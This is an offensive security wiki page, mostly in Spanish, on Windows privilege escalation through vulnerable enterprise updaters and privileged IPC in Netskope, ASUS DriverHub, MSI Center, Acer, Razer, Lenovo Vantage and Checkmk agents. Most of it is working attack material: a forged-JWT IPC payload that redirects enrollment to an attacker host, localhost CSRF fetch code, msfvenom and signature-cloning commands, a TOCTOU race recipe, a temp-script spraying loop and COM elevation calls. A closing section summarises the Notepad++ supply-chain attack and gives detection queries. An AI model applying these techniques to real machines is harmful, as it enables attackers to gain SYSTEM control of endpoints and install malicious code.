# Abusing Enterprise Auto-Updaters and Privileged IPC (e.g., Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

Esta página generaliza una clase de cadenas de escalada local de privilegios en Windows encontradas en agentes endpoint empresariales y updaters que exponen una superficie IPC de baja fricción y un flujo de actualización privilegiado. Un ejemplo representativo es Netskope Client for Windows < R129 (CVE-2025-0309), donde un usuario con pocos privilegios puede forzar el enrolamiento en un servidor controlado por el atacante y luego entregar un MSI malicioso que el servicio SYSTEM instala.

Ideas clave que puedes reutilizar contra productos similares:
- Abuse a privileged service’s localhost IPC to force re-enrollment or reconfiguration to an attacker server.
- Implement the vendor’s update endpoints, deliver a rogue Trusted Root CA, and point the updater to a malicious, “signed” package.
- Evade weak signer checks (CN allow-lists), optional digest flags, and lax MSI properties.
- If IPC is “encrypted”, derive the key/IV from world-readable machine identifiers stored in the registry.
- If the service restricts callers by image path/process name, inject into an allow-listed process or spawn one suspended and bootstrap your DLL via a minimal thread-context patch.

---
## 1) Forcing enrollment to an attacker server via localhost IPC

Many agents ship a user-mode UI process that talks to a SYSTEM service over localhost TCP using JSON.

Observed in Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Exploit flow:
1) Craft a JWT enrollment token whose claims control the backend host (e.g., AddonUrl). Use alg=None so no signature is required.
2) Send the IPC message invoking the provisioning command with your JWT and tenant name:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) El servicio empieza a golpear tu rogue server para enrollment/config, por ejemplo:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notes:
- If caller verification is path/name-based, originate the request from an allow-listed vendor binary (see §4).

---
## 2) Hijacking the update channel to run code as SYSTEM

Once the client talks to your server, implement the expected endpoints and steer it to an attacker MSI. Typical sequence:

1) /v2/config/org/clientconfig → Return JSON config with a very short updater interval, e.g.:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Devuelve un certificado CA en PEM. El servicio lo instala en el Local Machine Trusted Root store.
3) /v2/checkupdate → Proporciona metadatos que apuntan a un MSI malicioso y a una versión falsa.

Bypassing common checks seen in the wild:
- Signer CN allow-list: el servicio puede verificar solo que el Subject CN sea “netSkope Inc” o “Netskope, Inc.”. Tu rogue CA puede emitir un leaf con ese CN y firmar el MSI.
- CERT_DIGEST property: incluye una propiedad benigna del MSI llamada CERT_DIGEST. No se aplica enforcement en la instalación.
- Optional digest enforcement: un flag de config (p. ej., check_msi_digest=false) desactiva la validación criptográfica extra.

Resultado: el servicio SYSTEM instala tu MSI desde
C:\ProgramData\Netskope\stAgent\data\*.msi
ejecutando código arbitrario como NT AUTHORITY\SYSTEM.

Lección del patch-bypass: si un vendor responde permitiendo una pequeña lista de dominios “trusted” en lugar de autenticar criptográficamente la fuente de actualización, busca redirectors o reverse proxies propiedad del vendor que todavía te permitan dirigir el tráfico. En el caso de Netskope, una investigación pública posterior mostró que una allow-list de la era R129 aún podía abusarse a través de `rproxy.goskope.com`, que hacía proxy de contenido de Azure App Service controlado por el atacante. Trata los hostname allow-lists como un speed bump, no como un trust boundary.

---
## 3) Forging encrypted IPC requests (when present)

Desde R127, Netskope envolvía el IPC JSON en un campo encryptData que parece Base64. El reversing mostró AES con key/IV derivados de valores del registro legibles por cualquier usuario:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Los attackers pueden reproducir la encriptación y enviar comandos encriptados válidos desde un standard user. Consejo general: si un agent de repente “encrypts” su IPC, busca device IDs, product GUIDs, install IDs bajo HKLM como material.

---
## 4) Bypassing IPC caller allow-lists (path/name checks)

Algunos servicios intentan autenticar al peer resolviendo el PID de la conexión TCP y comparando la ruta/nombre de la imagen con binaries del vendor incluidos en allow-list y ubicados bajo Program Files (por ejemplo, stagentui.exe, bwansvc.exe, epdlp.exe).

Dos bypasses prácticos:
- DLL injection en un proceso incluido en la allow-list (por ejemplo, nsdiag.exe) y proxy IPC desde dentro de él.
- Lanzar un binary incluido en la allow-list en estado suspended y arrancar tu proxy DLL sin CreateRemoteThread (ver §5) para cumplir las reglas de tamper impuestas por el driver.

---
## 5) Tamper-protection friendly injection: suspended process + NtContinue patch

Los productos suelen incluir un minifilter/OB callbacks driver (por ejemplo, Stadrv) para quitar derechos peligrosos de handles a procesos protegidos:
- Process: elimina PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: restringe a THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Un loader en user-mode fiable que respeta estas restricciones:
1) CreateProcess de un binary del vendor con CREATE_SUSPENDED.
2) Obtén los handles que todavía te están permitidos: PROCESS_VM_WRITE | PROCESS_VM_OPERATION sobre el process, y un thread handle con THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (o solo THREAD_RESUME si parcheas código en un RIP conocido).
3) Sobrescribe ntdll!NtContinue (u otro thunk temprano y garantizado en memoria) con un pequeño stub que llame a LoadLibraryW sobre la ruta de tu DLL, y luego vuelva.
4) ResumeThread para activar tu stub dentro del proceso y cargar tu DLL.

Como nunca usaste PROCESS_CREATE_THREAD ni PROCESS_SUSPEND_RESUME sobre un proceso ya protegido (lo creaste tú), la policy del driver se cumple.

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) automatiza una rogue CA, la firma de un MSI malicioso y sirve los endpoints necesarios: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope es un custom IPC client que construye mensajes IPC arbitrarios (opcionalmente encriptados con AES) e incluye la inyección en proceso suspended para originar tráfico desde un binary incluido en la allow-list.

## 7) Fast triage workflow for unknown updater/IPC surfaces

Cuando te enfrentas a un nuevo endpoint agent o a una suite “helper” de motherboard, un workflow rápido suele ser suficiente para saber si estás ante un objetivo prometedor de privesc:

1) Enumera listeners de loopback y relaciónalos con procesos del vendor:
```powershell
Get-NetTCPConnection -State Listen |
Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
Select-Object LocalAddress,LocalPort,OwningProcess,
@{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```
2) Enumera candidate named pipes:
```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```
3) Minar datos de enrutamiento respaldados por el registro utilizados por servidores IPC basados en plugins:
```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
Select-Object PSChildName
```
4) Extrae primero los nombres de endpoint, las claves JSON y los command IDs del cliente en user-mode. Los frontends empaquetados de Electron/.NET con frecuencia leak el esquema completo:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
-Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```
5) Busca el predicado de confianza real, no solo la ruta de código que finalmente lanza el proceso:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
-Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```
Patrones que vale la pena priorizar:
- `CryptQueryObject`/análisis de certificado sin `WinVerifyTrust` normalmente significa que “el certificado existe” se trató como “el certificado es confiable”, lo que permite clonación de certificados u otros trucos de falso firmante.
- Las comprobaciones por subcadena/sufijo sobre `Origin`, `Referer`, URLs de descarga, nombres de proceso o CNs del firmante no son autenticación. `contains(".vendor.com")` suele ser explotable con dominios parecidos controlados por el atacante.
- Si la GUI de bajo privilegio decide “el archivo es confiable” y el broker SYSTEM solo consume ese resultado, parchear o reimplementar la DLL/JS del lado del cliente suele saltarse por completo el límite (validación dividida estilo Razer).
- Si el broker copia un payload a `%TEMP%`/`C:\Windows\Temp` y luego lo valida o lo programa desde esa ruta, prueba de inmediato ventanas de reemplazo TOCTOU y módulos plugin hermanos que expongan wrappers alternativos `ExecuteTask()` con comprobaciones más débiles.

Para objetivos muy basados en named-pipe, PipeViewer es una forma rápida de detectar DACLs débiles y pipes accesibles remotamente antes de empezar a revertir el protocolo en profundidad.

Si el objetivo autentica a los llamadores solo por PID, ruta de imagen o nombre de proceso, trátalo como un bache de velocidad y no como un límite: inyectar en el cliente legítimo, o hacer la conexión desde un proceso en allow-list, suele bastar para satisfacer las comprobaciones del servidor. Para named pipes específicamente, [esta página sobre client impersonation y pipe abuse](named-pipe-client-impersonation.md) cubre el primitivo con más profundidad.

---
## 8) Modular add-in brokers authenticated only by vendor signatures (Lenovo Vantage pattern)

Una variación más nueva que vale la pena buscar es el **signed-client RPC broker**: un proceso de escritorio Lenovo firmado y de bajo privilegio habla con un servicio SYSTEM, y el servicio enruta comandos JSON a un conjunto de add-ins descritos en XML bajo `%ProgramData%`. Una vez que se logra ejecución de código **dentro de cualquier cliente firmado aceptado**, cada contrato `runas="system"` pasa a formar parte de tu superficie de ataque.

Primitivas de alto valor observadas en la investigación de Lenovo Vantage:
- **Confiar en el llamador porque está firmado por el vendor**: los investigadores alcanzaron un contexto autenticado copiando un EXE firmado por Lenovo a un directorio escribible y satisfaciendo un DLL side-load (`profapi.dll`) para que se ejecutara código arbitrario dentro de un cliente en el que el servicio ya confiaba.
- **Descubrimiento de superficie de ataque guiado por manifiestos**: los add-ins se declaran en `C:\ProgramData\Lenovo\Vantage\Addins\*.xml`; varios contratos se ejecutan como `SYSTEM`, así que enumerar esos manifiestos suele revelar los verdaderos verbos privilegiados más rápido que revertir el broker en sí.
- **Bugs por comando detrás del canal autenticado**: una vez dentro del cliente confiable, la investigación pública encontró path-traversal + race conditions en verbos de update/install, abuso de raw-SQL en bases de datos de ajustes privilegiados, y comprobaciones de rutas de registro basadas en substring que permitían escrituras fuera del hive previsto.

Recon útil en un objetivo:
```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
-Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```
Practical takeaway: whenever a helper suite exposes a broker that first authenticates the **caller process** and only then dispatches into dozens of plugin/add-in commands, do not stop after bypassing the front-door trust check. Dump the manifest/contract table and fuzz each high-privilege verb independently; the authenticated channel usually hides several second-stage bugs.

---
## 1) Browser-to-localhost CSRF against privileged HTTP APIs (ASUS DriverHub)

DriverHub ships a user-mode HTTP service (ADU.exe) on 127.0.0.1:53000 that expects browser calls coming from https://driverhub.asus.com. The origin filter simply performs `string_contains(".asus.com")` over the Origin header and over download URLs exposed by `/asus/v1.0/*`. Any attacker-controlled host such as `https://driverhub.asus.com.attacker.tld` therefore passes the check and can issue state-changing requests from JavaScript. See [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) for additional bypass patterns.

Practical flow:
1) Register a domain that embeds `.asus.com` and host a malicious webpage there.
2) Use `fetch` or XHR to call a privileged endpoint (e.g., `Reboot`, `UpdateApp`) on `http://127.0.0.1:53000`.
3) Send the JSON body expected by the handler – the packed frontend JS shows the schema below.
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
Incluso la CLI de PowerShell que se muestra abajo tiene éxito cuando el encabezado Origin se falsifica con el valor confiable:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Cualquier visita del navegador al sitio del atacante se convierte por tanto en un CSRF local de 1 clic (o 0 clics vía `onload`) que activa un helper SYSTEM.

---
## 2) Insecure code-signing verification & certificate cloning (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` descarga ejecutables arbitrarios definidos en el cuerpo JSON y los cachea en `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. La validación de la URL de descarga reutiliza la misma lógica de substring, así que `http://updates.asus.com.attacker.tld:8000/payload.exe` es aceptada. Después de la descarga, ADU.exe solo comprueba que el PE contenga una signature y que la cadena Subject coincida con ASUS antes de ejecutarlo – sin `WinVerifyTrust`, sin validación de chain.

Para weaponize el flujo:
1) Crea un payload (por ejemplo, `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Clona el signer de ASUS en él (por ejemplo, `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Aloja `pwn.exe` en un dominio parecido a `.asus.com` y dispara UpdateApp vía el browser CSRF anterior.

Como tanto el Origin como los filtros de URL son basados en substring y la comprobación del signer solo compara strings, DriverHub descarga y ejecuta el binario del atacante bajo su contexto elevado.

---
## 1) TOCTOU inside updater copy/execute paths (MSI Center CMD_AutoUpdateSDK)

El servicio SYSTEM de MSI Center expone un protocolo TCP donde cada frame es `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. El componente principal (Component ID `0f 27 00 00`) incluye `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Su handler:
1) Copia el ejecutable suministrado a `C:\Windows\Temp\MSI Center SDK.exe`.
2) Verifica la signature vía `CS_CommonAPI.EX_CA::Verify` (el certificate subject debe ser “MICRO-STAR INTERNATIONAL CO., LTD.” y `WinVerifyTrust` debe tener éxito).
3) Crea una scheduled task que ejecuta el archivo temporal como SYSTEM con argumentos controlados por el atacante.

El archivo copiado no se bloquea entre la verificación y `ExecuteTask()`. Un atacante puede:
- Enviar Frame A apuntando a un binario legítimo firmado por MSI (garantiza que la comprobación de signature pase y que la tarea se encole).
- Hacer race con mensajes Frame B repetidos que apunten a un payload malicioso, sobrescribiendo `MSI Center SDK.exe` justo después de que termine la verificación.

Cuando el scheduler se activa, ejecuta el payload sobrescrito bajo SYSTEM a pesar de haber validado el archivo original. Una explotación fiable usa dos goroutines/threads que spamean CMD_AutoUpdateSDK hasta ganar la ventana TOCTOU.

---
## 2) Abusing custom SYSTEM-level IPC & impersonation (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- Cada plugin/DLL cargado por `MSI.CentralServer.exe` recibe un Component ID almacenado bajo `HKLM\SOFTWARE\MSI\MSI_CentralServer`. Los primeros 4 bytes de un frame seleccionan ese componente, permitiendo a los atacantes enrutar comandos a módulos arbitrarios.
- Los plugins pueden definir sus propios task runners. `Support\API_Support.dll` expone `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` y llama directamente a `API_Support.EX_Task::ExecuteTask()` con **sin signature validation** – cualquier usuario local puede apuntarlo a `C:\Users\<user>\Desktop\payload.exe` y obtener ejecución SYSTEM de forma determinista.
- Sniffing del loopback con Wireshark o instrumentar los binarios .NET en dnSpy revela rápidamente el mapeo Component ↔ command; clientes personalizados en Go/ Python pueden luego reproducir los frames.

### Acer Control Centre named pipes & impersonation levels
- `ACCSvc.exe` (SYSTEM) expone `\\.\pipe\treadstone_service_LightMode`, y su ACL discrecional permite clientes remotos (por ejemplo, `\\TARGET\pipe\treadstone_service_LightMode`). Enviar el command ID `7` con una ruta de archivo invoca la rutina de spawning de procesos del servicio.
- La librería cliente serializa un byte terminador mágico (113) junto con args. La instrumentación dinámica con Frida/`TsDotNetLib` (ver [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) para tips de instrumentation) muestra que el handler nativo mapea este valor a un `SECURITY_IMPERSONATION_LEVEL` y a un integrity SID antes de llamar a `CreateProcessAsUser`.
- Sustituir 113 (`0x71`) por 114 (`0x72`) cae en la rama genérica que conserva el token SYSTEM completo y establece un high-integrity SID (`S-1-16-12288`). El binario lanzado por tanto se ejecuta como SYSTEM sin restricciones, tanto localmente como entre máquinas.
- Combínalo con la bandera de instalador expuesta (`Setup.exe -nocheck`) para levantar ACC incluso en VMs de laboratorio y probar el pipe sin hardware del fabricante.

Estos bugs de IPC resaltan por qué los servicios localhost deben imponer autenticación mutua (ALPC SIDs, filtros `ImpersonationLevel=Impersonation`, token filtering) y por qué el helper de cada módulo para “run arbitrary binary” debe compartir las mismas verificaciones de signer.

---
## 3) COM/IPC “elevator” helpers backed by weak user-mode validation (Razer Synapse 4)

Razer Synapse 4 añadió otro patrón útil a esta familia: un usuario con pocos privilegios puede pedir a un helper COM que lance un proceso a través de `RzUtility.Elevator`, mientras la decisión de confianza se delega a una DLL en user-mode (`simple_service.dll`) en lugar de imponerse de forma robusta dentro del boundary privilegiado.

Observed exploitation path:
- Instanciar el objeto COM `RzUtility.Elevator`.
- Llamar a `LaunchProcessNoWait(<path>, "", 1)` para solicitar un launch elevado.
- En el PoC público, el gate de PE-signature dentro de `simple_service.dll` se parchea antes de emitir la solicitud, permitiendo lanzar un ejecutable arbitrario elegido por el atacante.

Invocación mínima de PowerShell:
```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```
Conclusión general: al revertir suites “helper”, no te detengas en localhost TCP o named pipes. Revisa clases COM con nombres como `Elevator`, `Launcher`, `Updater` o `Utility`, y luego verifica si el servicio privilegiado realmente valida el binario objetivo o si simplemente confía en un resultado calculado por una DLL client en user-mode que se puede parchear. Este patrón va más allá de Razer: cualquier diseño dividido en el que el broker de alto privilegio consuma una decisión allow/deny desde la parte de bajo privilegio es un candidato a superficie de privesc.


---
## Ejecución predecible de scripts temporales durante la reparación MSI (Checkmk Agent / CVE-2024-0670)

Algunos agentes de Windows todavía implementan acciones privilegiadas escribiendo un `.cmd` temporal en `C:\Windows\Temp` y ejecutándolo como `SYSTEM`. Si el nombre del archivo es predecible y el servicio no recrea de forma segura los archivos existentes, un usuario de bajo privilegio puede precrear el futuro archivo temporal como **solo lectura** y hacer que el proceso privilegiado ejecute contenido controlado por el atacante en lugar de su propio script.

Observado en builds vulnerables de Checkmk Agent:
- patrón temporal: `cmk_all_<PID>_1.cmd`
- ramas afectadas: `2.0.0`, `2.1.0`, `2.2.0`
- trigger: reparación MSI **repair** del paquete de agente en caché

Flujo práctico:
1. Estima un rango de PID realista a partir de los IDs de proceso actuales o del PID del agente en ejecución.
2. Escribe un payload corto `.cmd` en **ASCII** (`Set-Content -Encoding Ascii` o redirección de `cmd.exe`; evita la salida UTF-16 de PowerShell para archivos batch).
3. Haz spray de `C:\Windows\Temp\cmk_all_<PID>_1.cmd` en todo el rango candidato y marca cada archivo como solo lectura.
4. Dispara una reparación del MSI en caché para que el servicio privilegiado intente regenerar y luego ejecute el script temporal.
```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```
Si el producto vulnerable está instalado con Windows Installer, mapea el MSI cacheado de nombre aleatorio bajo `C:\Windows\Installer` de vuelta a su nombre de producto antes de desencadenar la reparación:
```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
ForEach-Object {
$p = Get-ItemProperty $_.PSPath
[PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
} | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```
Notas operativas:
- `qwinsta` es útil cuando `msiexec /fa` falla desde un WinRM shell no interactivo y necesitas entender si una sesión de escritorio/desconectada existente puede activar la reparación correctamente.
- Este patrón se generaliza a otros endpoint agents y updaters que **stage temp scripts en ubicaciones world-writable y luego los ejecutan como SYSTEM**. Busca nombres predecibles, semántica de create exclusivo ausente y flujos de repair/update que puedan activarse on demand.

---
## Remote supply-chain hijack via weak updater validation (WinGUp / Notepad++)

Entre junio de 2025 y diciembre de 2025, attackers que comprometieron la infraestructura de hosting detrás del flujo de update de Notepad++ sirvieron selectivamente manifests maliciosos a víctimas elegidas. Los updaters antiguos basados en WinGUp no verificaban completamente la autenticidad de las actualizaciones, así que una respuesta XML hostil podía redirigir a los clientes a URLs controladas por atacantes. Como el cliente aceptaba contenido HTTPS sin imponer tanto una trusted certificate chain como una firma PE válida en el instalador descargado, las víctimas descargaron y ejecutaron un `update.exe` NSIS trojanizado.

Flujo operacional (no se requiere local exploit):
1. **Infrastructure interception**: comprometer CDN/hosting y responder a las comprobaciones de update con metadata del atacante apuntando a una URL de descarga maliciosa.
2. **Trojanized NSIS**: el instalador obtiene/ejecuta un payload y abusa de dos cadenas de ejecución:
- **Bring-your-own signed binary + sideload**: empaqueta el `BluetoothService.exe` firmado de Bitdefender y deja caer un `log.dll` malicioso en su search path. Cuando se ejecuta el binario firmado, Windows hace sideload de `log.dll`, que descifra y carga reflectively la puerta trasera Chrysalis (protegida por Warbird + API hashing para dificultar la detección estática).
- **Scripted shellcode injection**: NSIS ejecuta un script Lua compilado que usa Win32 APIs (p. ej., `EnumWindowStationsW`) para inyectar shellcode y stage Cobalt Strike Beacon.

Conclusiones de hardening/detección para cualquier auto-updater:
- Impón verificación de **certificate + signature** del instalador descargado (pin al signer del vendor, rechaza CN/chain no coincidentes) y firma el propio update manifest (p. ej., XMLDSig). Bloquea redirects controlados por el manifest salvo que estén validados.
- Trata **BYO signed binary sideloading** como un pivote de detección post-download: alerta cuando un EXE firmado de un vendor carga un nombre de DLL desde fuera de su canonical install path (p. ej., Bitdefender cargando `log.dll` desde Temp/Downloads) y cuando un updater deja/ejecuta instaladores desde temp con firmas no pertenecientes al vendor.
- Monitoriza **artefactos específicos de malware** observados en esta cadena (útiles como pivotes genéricos): mutex `Global\Jdhfv_1.0.1`, escrituras anómalas de `gup.exe` a `%TEMP%`, y etapas de inyección de shellcode impulsadas por Lua.
- Notepad++ respondió reforzando WinGUp en v8.8.9 y versiones posteriores: ahora el XML devuelto está firmado (XMLDSig), y las builds más nuevas imponen verificación de certificate + signature del instalador descargado en lugar de confiar solo en el transport.

<details>
<summary>Cortex XDR XQL – Bitdefender-signed EXE sideloading <code>log.dll</code> (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> launching a non-Notepad++ installer</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

Estos patrones se generalizan a cualquier updater que acepta manifests no firmados o no fija los firmantes del installer—network hijack + malicious installer + BYO-signed sideloading da remote code execution bajo la apariencia de updates “trusted”.

---
## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [Netskope Security Advisory NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [SEC Consult – Local Privilege Escalation via writable files in Checkmk Agent](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [Checkmk Werk #16361 – Privilege escalation in Windows agent](https://checkmk.com/werk/16361)
- [RunasCs](https://github.com/antonioCoco/RunasCs)
- [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [Unit 42 – Nation-State Actors Exploit Notepad++ Supply Chain](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [AmberWolf – Bypassing the fix for CVE-2025-0309 in Netskope Client for Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [Atredis – Uncovering Privilege Escalation Bugs in Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)

{{#include ../../banners/hacktricks-training.md}}
